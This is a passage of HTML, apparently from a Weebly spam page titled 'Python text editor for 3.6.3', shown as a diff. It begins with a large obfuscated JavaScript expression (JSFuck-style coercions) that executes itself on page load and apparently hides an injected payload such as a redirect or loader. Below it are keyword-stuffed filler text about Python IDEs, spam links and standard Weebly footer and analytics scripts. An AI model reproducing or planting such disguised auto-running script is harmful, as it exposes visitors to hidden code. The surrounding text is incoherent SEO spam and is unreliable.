+$[43]+$[44]+$[8]+$[3]+$[45]+([]+[]+[][[]])[!+[]+!+[]]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+(![]+[])[+!+[]]+$[24]+$[44]+$[46]+$[47]+(!![]+[])[+[]]+$[14]+([]+[]+[][[]])[!+[]+!+[]]+$[42]+([![]]+[][[]])[+!+[]+[+[]]]+$[48]+(![]+[])[+[]]+$[10]+(![]+[])[!+[]+!+[]+!+[]]+$[36]+$[49]+([![]]+{})[+!+[]+[+[]]]+$[25]+$[30]+$[10]+$[39]+([]+[]+{})[!+[]+!+[]]+$[39]+$[36]+([]+[]+[][[]])[+!+[]]+$[21]+([]+[]+{})[+!+[]+[+[]]]+$[35]+$[50]+(!![]+[])[!+[]+!+[]+!+[]]+$[24]+$[3]+$[51]+$[27]+$[14]+$[52]+$[44]+$[47]+$[35]+(![]+[])[+!+[]]+$[36]+([]+[]+[][[]])[!+[]+!+[]]+$[33]+$[53]+$[28]+$[47]+$[51]+$[16]+$[29]+(!![]+[])[+[]]+$[44]+$[27]+$[14]+$[52]+$[26]+$[37]+(![]+[])[+[]]+([]+[]+{})[!+[]+!+[]]+$[16]+$[49]+(!![]+[])[!+[]+!+[]+!+[]]+$[50]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+$[41]+(!![]+[])[!+[]+!+[]+!+[]]+$[3]+(![]+[])[!+[]+!+[]]+$[51]+$[31]+$[27]+$[21]+$[28]+$[50]+([]+[]+{})[+!+[]+[+[]]]+$[52]+$[43]+([]+[]+{})[!+[]+!+[]]+(!![]+[])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+$[54]+$[42]+$[37]+$[38]+$[26]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+$[3]+(![]+[])[!+[]+!+[]]+$[52]+$[1]+$[53]+$[27]+$[36]+$[3]+$[43]+$[0]+(!![]+[])[+[]]+$[50]+$[23]+(!![]+[])[+!+[]]+([]+[]+[][[]])[+!+[]]+(![]+[])[!+[]+!+[]]+$[33]+(![]+[])[!+[]+!+[]+!+[]]+$[43]+([]+[]+[][[]])[+!+[]]+$[16]+$[52]+$[27]+$[33]+(![]+[])[+[]]+$[31]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+$[34]+$[37]+([]+[]+{})[+!+[]+[+[]]]+(![]+[])[+[]]+$[38]+(![]+[])[!+[]+!+[]+!+[]]+([]+[]+{})[+!+[]+[+[]]]+(!![]+[])[+!+[]]+$[14]+([]+[]+{})[+!+[]]+$[46]+$[45]+$[33]+(!![]+[])[+!+[]]+([]+[]+[][[]])[+!+[]]+$[28]+([]+[]+[][[]])[+!+[]]+$[46]+$[26]+$[38]+$[33]+$[30]+$[33]+$[42]+$[21]+$[26]+$[40]+$[55]+$[30]+$[33]+$[52]+$[35]+$[20]+$[8]+$[54]+([]+[]+[][[]])[+!+[]]+$[25]+$[54]+([]+[]+{})[+!+[]+[+[]]]+$[49]+$[22]+$[25]+$[3]+$[23]+$[23]+$[47]+$[43]+$[49]+$[52]+$[31]+$[9]+$[11]+$[4]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+$[42]+$[39]+$[27]+$[54]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[2]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[9]+$[56]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+$[3]+(!![]+[])[!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+([]+[]+{})[!+[]+!+[]]+([]+[]+{})[+!+[]]+(!![]+[])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+$[2]+$[57]+$[25]+$[57]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+$[3]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+{})[!+[]+!+[]]+([]+[]+{})[+!+[]]+(!![]+[])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+$[2]+$[57]+([]+[]+[][[]])[+!+[]]+([]+[]+{})[+!+[]]+$[57]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+$[3]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+$[30]+(![]+[])[+!+[]]+([![]]+{})[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+$[10]+$[2]+$[57]+$[25]+$[57]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[+!+[]]+([]+[]+{})[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+$[10]+$[2]+$[57]+(![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+([]+[]+{})[+!+[]]+$[57]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+([![]]+{})[+!+[]+[+[]]]+$[2]+$[57]+$[58]+$[58]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(!![]+[])[+!+[]]+$[4]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+(![]+[])[+[]]+([]+[]+{})[+!+[]]+$[58]+([![]]+{})[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([![]]+{})[+!+[]+[+[]]]+$[16]+$[4]+$[30]+$[18]+$[30]+$[59]+$[16]+(!![]+[])[!+[]+!+[]+!+[]]+$[17]+$[2]+$[41]+(!![]+[])[+!+[]]+$[8]+$[47]+$[25]+([]+[]+{})[+!+[]+[+[]]]+(!![]+[])[+!+[]]+([]+[]+{})[+!+[]]+$[48]+$[8]+([]+[]+[][[]])[+!+[]]+$[25]+$[47]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[+[]]+$[3]+$[33]+$[10]+([![]]+{})[+!+[]+[+[]]]+$[45]+$[60]+$[45]+$[2]+$[50]+$[17]+(!![]+[])[+[]]+$[18]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+$[61]+$[29]+$[25]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+(!![]+[])[+[]]+$[61]+$[29]+$[25]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+([]+[]+{})[+!+[]]+(!![]+[])[+!+[]]+$[61]+$[29]+$[25]+(![]+[])[+[]]+([]+[]+{})[+!+[]]+(!![]+[])[+!+[]]+$[61]+$[29]+$[25]+$[53]+$[4]+$[46]+$[4]+$[53]+$[60]+$[30]+$[2]+$[49]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+$[60]+(![]+[])[!+[]+!+[]+!+[]]+$[2]+$[31]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+$[60]+(!![]+[])[+!+[]]+$[2]+$[9]+$[62]+([]+[]+[][[]])[!+[]+!+[]]+([]+[]+{})[+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]]+$[3]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[+[]]+$[4]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+$[4]+(![]+[])[!+[]+!+[]+!+[]]+$[30]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+$[7]+$[9]+$[58]+$[9]+$[11]+([]+[]+{})[+[]]+$[29]+([]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[]+!+[])]+$[62]+$[9]+$[60]+([![]]+{})[+!+[]+[+[]]]+$[2]+$[49]+$[14]+$[48]+$[61]+$[29]+$[25]+(+{}+[]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[23]+$[60]+(![]+[])[!+[]+!+[]+!+[]]+([![]]+{})[+!+[]+[+[]]]+$[2]+(![]+[])[!+[]+!+[]+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+$[30]+(!![]+[])[+[]]+$[60]+([]+[]+[][[]])[!+[]+!+[]]+$[2]+$[25]+$[55]+$[4]+$[29]+$[25]+$[29]+$[29]+$[60]+(!![]+[])[+[]]+$[2]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(!![]+[])[+!+[]]+$[4]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+(![]+[])[+[]]+([]+[]+{})[+!+[]]+$[60]+$[3]+$[63]+(!![]+[])[+!+[]]+$[2]+$[18]+([]+[]+{})[+!+[]]+$[30]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[10]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[16]+$[4]+$[23]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+{})[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+$[17]+$[4]+([![]]+{})[+!+[]+[+[]]]+([]+[]+{})[+!+[]]+$[3]+$[60]+$[16]+$[2]+$[39]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+(!![]+[])[+[]]+$[60]+(![]+[])[+[]]+(!![]+[])[+!+[]]+$[3]+$[2]+(![]+[])[+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+$[3]+(!![]+[])[!+[]+!+[]+!+[]]+$[60]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+$[2]+$[9]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[62]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+([![]]+{})[+!+[]+[+[]]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[51]+$[1]+$[22]+$[40]+([]+[]+{})[+!+[]]+$[3]+$[30]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[+[]]+$[7]+([]+[]+[][[]])[!+[]+!+[]]+([]+[]+{})[+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]]+$[3]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[+[]]+$[4]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+$[11]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[62]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[9]+$[60]+$[16]+(!![]+[])[!+[]+!+[]+!+[]]+$[17]+$[23]+([]+[]+{})[+!+[]]+(!![]+[])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+$[2]+$[9]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[62]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[9]+$[60]+$[9]+$[62]+$[23]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+([]+[]+{})[+!+[]]+$[23]+$[4]+(![]+[])[!+[]+!+[]]+([]+[]+{})[+!+[]]+([![]]+{})[+!+[]+[+[]]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+$[4]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!+[]]+([![]]+{})[+!+[]+[+[]]]+$[18]+$[4]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[30]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+$[7]+$[9]+$[59]+$[9]+$[64]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[9]+$[60]+$[9]+$[11]+$[62]+$[9]+$[57]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+$[17]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[2]+$[57]+$[30]+([]+[]+{})[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+$[65]+(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+$[8]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+$[5]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[23]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[+[]]+$[18]+$[65]+$[14]+$[25]+$[25]+$[61]+$[5]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[18]+(!![]+[])[!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+$[10]+$[18]+(!![]+[])[+[]]+$[65]+$[14]+$[25]+$[25]+$[61]+$[5]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[33]+$[13]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+$[65]+$[53]+$[25]+$[25]+$[25]+$[25]+$[5]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[+[]]+$[65]+$[25]+$[5]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(!![]+[])[+[]]+([]+[]+{})[+!+[]]+$[30]+$[65]+$[25]+$[5]+$[57]+$[66]+$[56]+$[58]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+$[3]+(!![]+[])[!+[]+!+[]+!+[]]+$[66]+$[9]+$[6]+$[67])();
+            </script>
+            <img alt="python text editor for 3.6.3" src="https://www.tecmint.com/wp-content/uploads/2018/06/Python-Interpreter.png" title="python text editor for 3.6.3"/>
+            <br/>
+            <ul>
+             <li>
+              <a href="#Python-text-editor-for-3.6.3-how-to">
+               #Python text editor for 3.6.3 how to
+              </a>
+             </li>
+            </ul>
+            <br/>
+            <p>
+             Looking to master Python? Complete Python Bootcamp course from udemy will be a great stepping stone for you.īefore moving ahead, let us first see what IDEs and code editors are and the requirements for a good Python coding environment. We have mentioned some majorly used ones as recommended by the Python community. Each Python IDE or code editor differs from the other regarding its features, user interface, and so forth. However, if you want to work on larger projects, we recommend using a dedicated code editor or an integrated development environment (IDE). You
+             <a href="https://trendspassl.weebly.com/apache-openoffice-for-windows-10.html">
+              can write Python code
+             </a>
+             using a shell or shell for small projects. Python is a versatile language, which means that it can be used in many applications ranging from Blender (3D modelling software) to web development.
+            </p>
+            <img alt="python text editor for 3.6.3" src="http://linuxcnc.org/docs/html/gui/images/qtaxis.png" title="python text editor for 3.6.3"/>
+            <p>
+             Python interpreters are available on several operating systems such as Linux, macOS, and Windows. If you are new to programming, it is recommended to start with Python. The language has evolved enormously with the contribution of many developers/programmers. Launched in 1991 by its creator Guido van Rossum, Python is one of the main programming languages ​​used to automate specific repetitive tasks.
+            </p>
+            <img alt="python text editor for 3.6.3" src="https://www.poftut.com/wp-content/uploads/2017/10/img_59dcd66c358c1.png" title="python text editor for 3.6.3"/>
+            <h2 id="Python-text-editor-for-3.6.3-how-to">
+             #Python text editor for 3.6.3 how to
+            </h2>
+            <p>
+             How
+             <a href="https://lalapablog.weebly.com/how-to-fix-legen-and-axes-titles-microsoft-excel-2011.html">
+              to choose the best Python
+             </a>
+             IDE in 2022?.10 Best Python IDE &amp; Python Code Editors.Requirements for a Good Python Coding Environment.
+            </p>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div class="sticky-footer-push">
+   </div>
+  </div>
+  <!--/.wrapper-->
+  <div id="footer-wrap">
+   <div class="container">
+    <style type="text/css">
+     @font-face {
+		font-family: SQMarket-Medium;
+		font-style: normal;
+		font-weight: 500;
+		src:
+			url("//cdn2.editmysite.com/fonts/SQ_Market/sqmarket-medium.woff2") format("woff2"),
+			url("//cdn2.editmysite.com/fonts/SQ_Market/sqmarket-medium.woff") format("woff");
+	}
+    </style>
+    <div id="weebly-footer-signup-container-v3">
+     <a class="signup-container-header" href="https://www.weebly.com/signup?utm_source=internal&amp;utm_medium=footer" id="signup-link-href" target="_blank">
+      <div class="powered-by">
+       <div class="footer-published-ab-powered-by">
+        Powered by
+        <span class="link weebly-icon">
+        </span>
+        <img class="footer-ab-published-toast-image" src="//cdn2.editmysite.com/images/site/footer/footer-toast-published-image-1.png"/>
+        <span class="footer-ab-published-toast-text">
+         Create your own unique website with customizable templates.
+        </span>
+        <span class="footer-ab-published-toast-button-wrapper">
+         <button class="footer-published-ab-button">
+          Get Started
+         </button>
+        </span>
+       </div>
+      </div>
+     </a>
+    </div>
+    <script src="//cdn2.editmysite.com/js/site/footerSignup.js?buildTime=1691191585" type="text/javascript">
+    </script>
+    <script type="text/javascript">
+     if (document.readystate === 'complete') {
+		Weebly.footer.setupContainer('cdn2.editmysite.com', '1691191585');
+	} else {
+		document.addEventListener('DOMContentLoaded', function() {
+			Weebly.footer.setupContainer('cdn2.editmysite.com', '1691191585');
+		});
+	}
+    </script>
+   </div>
+  </div>
+  <div class="navmobile-wrapper">
+   <div class="nav" id="navmobile">
+    <ul class="wsite-menu-default">
+     <li class="wsite-menu-item-wrap" id="active">
+      <a class="wsite-menu-item" href="/">
+       Python text editor for 3-6-3
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg142411861845668081">
+      <a class="wsite-menu-item" href="/how-to-update-my-mac-step-by-step.html">
+       How to update my mac step by step
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg897069097892404272">
+      <a class="wsite-menu-item" href="/blog.html">
+       Blog
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg164436977440741364">
+      <a class="wsite-menu-item" href="/intel-centrino-1030-specs.html">
+       Intel centrino 1030 specs
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg134098907613179300">
+      <a class="wsite-menu-item" href="/norton-security-2017-free-download.html">
+       Norton security 2017 free download
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg708540231919365612">
+      <a class="wsite-menu-item" href="/apple-macbook-pro-2015-sale.html">
+       Apple macbook pro 2015 sale
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg813603319811906379">
+      <a class="wsite-menu-item" href="/bitdefender-antivirus-free-edition-2015-download.html">
+       Bitdefender antivirus free edition 2015 download
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg995554746173559666">
+      <a class="wsite-menu-item" href="/dimmer-for-led-lights-stage-lighting.html">
+       Dimmer for led lights stage lighting
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg686728154916617171">
+      <a class="wsite-menu-item" href="/smoke-brushes-photoshop-cs6.html">
+       Smoke brushes photoshop cs6
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg390126558590655628">
+      <a class="wsite-menu-item" href="/rotate-pdf-pages-in-illustrator.html">
+       Rotate pdf pages in illustrator
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg498993912972964547">
+      <a class="wsite-menu-item" href="/nexus-2-windows-torrent-expansions.html">
+       Nexus 2 windows torrent expansions
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg478480490812937094">
+      <a class="wsite-menu-item" href="/wondershare-mobiletrans-discount-code.html">
+       Wondershare mobiletrans discount code
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg125070662151960833">
+      <a class="wsite-menu-item" href="/and-reference-to-python-in-visual-studio.html">
+       And reference to python in visual studio
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg192920739660972295">
+      <a class="wsite-menu-item" href="/lost-planet-2-pc-download.html">
+       Lost planet 2 pc download
+      </a>
+     </li>
+     <li class="wsite-menu-item-wrap" id="pg490018465603888103">
+      <a class="wsite-menu-item" href="/hp-oj8610-printfilterpipelinesvc-exe-crash.html">
+       Hp oj8610 printfilterpipelinesvc-exe crash
+      </a>
+     </li>
+    </ul>
+   </div>
+  </div>
+  <script src="/files/theme/mobile.js?1556896837" type="text/javascript">
+  </script>
+  <script src="/files/theme/plugins.js?1556896837" type="text/javascript">
+  </script>
+  <script src="/files/theme/custom.js?1556896837" type="text/javascript">
+  </script>
+  <div id="customer-accounts-app">
+  </div>
+  <script src="//cdn2.editmysite.com/js/site/main-customer-accounts-site.js?buildTime=1657307797">
+  </script>
+  <script type="text/javascript">
+   var _gaq = _gaq || [];
+	_gaq.push(['_setAccount', 'UA-7870337-1']);
+	_gaq.push(['_setDomainName', 'none']);
+	_gaq.push(['_setAllowLinker', true]);
+
+	(function() {
+		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+		// NOTE: keep the [1] if you replace this code. Otherwise cookie banner scripts won't be first on the page
+		var s = document.getElementsByTagName('script')[1]; s.parentNode.insertBefore(ga, s);
+	})();
+
+	_W.Analytics = _W.Analytics || {'trackers': {}};
+	_W.Analytics.trackers.wGA = '_gaq';
+  </script>
+  <script async="1" type="text/javascript">
+   // NOTE: keep the getElementsByTagName(o)**[1]** if you replace this code. Otherwise cookie banner scripts won't be first on the page
+	;(function(p,l,o,w,i,n,g){if(!p[i]){p.GlobalSnowplowNamespace=p.GlobalSnowplowNamespace||[];
+			p.GlobalSnowplowNamespace.push(i);p[i]=function(){(p[i].q=p[i].q||[]).push(arguments)
+			};p[i].q=p[i].q||[];n=l.createElement(o);g=l.getElementsByTagName(o)[1];n.async=1;
+			n.src=w;g.parentNode.insertBefore(n,g)}}(window,document,'script','//cdn2.editmysite.com/js/wsnbn/snowday262.js','snowday'));
+
+	var r = [99, 104, 101, 99, 107, 111, 117, 116, 46, 40, 119, 101, 101, 98, 108, 121, 124, 101, 100, 105, 116, 109, 121, 115, 105, 116, 101, 41, 46, 99, 111, 109];
+	var snPlObR = function(arr) {
+		var s = '';
+		for (var i = 0 ; i < arr.length ; i++){
+			s = s + String.fromCharCode(arr[i]);
+		}
+		return s;
+	};
+	var s = snPlObR(r);
+
+	var regEx = new RegExp(s);
+
+	_W.Analytics = _W.Analytics || {'trackers': {}};
+	_W.Analytics.trackers.wSP = 'snowday';
+	_W.Analytics.user_id = '133479403';
+	_W.Analytics.site_id = '672386862426528971';
+
+	var drSegmentsTag = document.getElementById('drSegments');
+	if (drSegmentsTag) {
+		_W.Analytics.spContexts = _W.Analytics.spContexts || [];
+
+		var segmentData = JSON.parse(drSegmentsTag.innerText);
+		segmentData.forEach(function(test) {
+			_W.Analytics.spContexts.push({
+				schema: "iglu:com.weebly/context_ab_segment/jsonschema/1-0-0",
+				data: {
+					test_id: test.name,
+					segment: test.variant,
+				}
+			});
+		});
+	}
+
+
+	(function(app_id, ec_hostname, discover_root_domain) {
+		var track = window[_W.Analytics.trackers.wSP];
+		if (!track) return;
+		track('newTracker', app_id, ec_hostname, {
+			appId: app_id,
+			post: true,
+			platform: 'web',
+			discoverRootDomain: discover_root_domain,
+			cookieName: '_snow_',
+			contexts: {
+				webPage: true,
+				performanceTiming: true,
+				gaCookies: true
+			},
+			crossDomainLinker: function (linkElement) {
+				return regEx.test(linkElement.href);
+			},
+			respectDoNotTrack: true
+		});
+		track('trackPageView', _W.Analytics.user_id+':'+_W.Analytics.site_id, _W.Analytics.spContexts);
+		track('crossDomainLinker', function (linkElement) {
+			return regEx.test(linkElement.href);
+		});
+	})(
+		'_wn',
+		'ec.editmysite.com',
+		false
+	);
+  </script>
+  <script>
+   (function(jQuery) {
+		try {
+			if (jQuery) {
+				jQuery('div.blog-social div.fb-like').attr('class', 'blog-social-item blog-fb-like');
+				var $commentFrame = jQuery('#commentArea iframe');
+				if ($commentFrame.length > 0) {
+					var frameHeight = jQuery($commentFrame[0].contentWindow.document).height() + 50;
+					$commentFrame.css('min-height', frameHeight + 'px');
+				}
+				if (jQuery('.product-button').length > 0){
+					jQuery(document).ready(function(){
+						jQuery('.product-button').parent().each(function(index, product){
+							if(jQuery(product).attr('target') == 'paypal'){
+								if (!jQuery(product).find('> [name="bn"]').length){
+									jQuery('<input>').attr({
+										type: 'hidden',
+										name: 'bn',
+										value: 'DragAndDropBuil_SP_EC'
+									}).appendTo(product);
+								}
+							}
+						});
+					});
+				}
+			}
+			else {
+				// Prototype
+				$$('div.blog-social div.fb-like').each(function(div) {
+					div.className = 'blog-social-item blog-fb-like';
+				});
+				$$('#commentArea iframe').each(function(iframe) {
+					iframe.style.minHeight = '410px';
+				});
+			}
+		}
+		catch(ex) {}
+	})(window._W && _W.jQuery);
+  </script>
+  <script>
+   window._W.isEUUser = false;
+	window._W.showCookieToAll = "";
+  </script>
+  <script>
+   (function(jQuery) {
+		try {
+			function forceShowCcLinks() {
+				var ccLinks = document.querySelector('.cc_links');
+				if (!ccLinks) {
+					return;
+				}
+
+				var ccLinksVisible = jQuery(ccLinks).is(':visible');
+				if (ccLinksVisible) {
+					return;
+				}
+
+
+				ccLinks.style.display = 'block';
+
+				var ccParent = ccLinks.parentElement;
+
+				var ccParentVisible = jQuery(ccParent).is(':visible');
+				if (ccParentVisible) {
+					return;
+				}
+
+				ccParent.style.display = 'block';
+
+				var ccGrandparent = ccParent.parentElement;
+				var ccGrandparentVisible = jQuery(ccGrandparent).is(':visible');
+				if (ccGrandparentVisible) {
+					return;
+				}
+				ccGrandparent.style.display = 'block';
+
+			}
+
+			function forceShowCcLinksForever() {
+				var tenSeconds = 10000;
+				forceShowCcLinks();
+				setTimeout(forceShowCcLinksForever, tenSeconds);
+			}
+
+			jQuery(document).ready(forceShowCcLinksForever);
+		}
+		catch(ex) {}
+	})(window._W && _W.jQuery);
+  </script>
+ </body>
+</html>
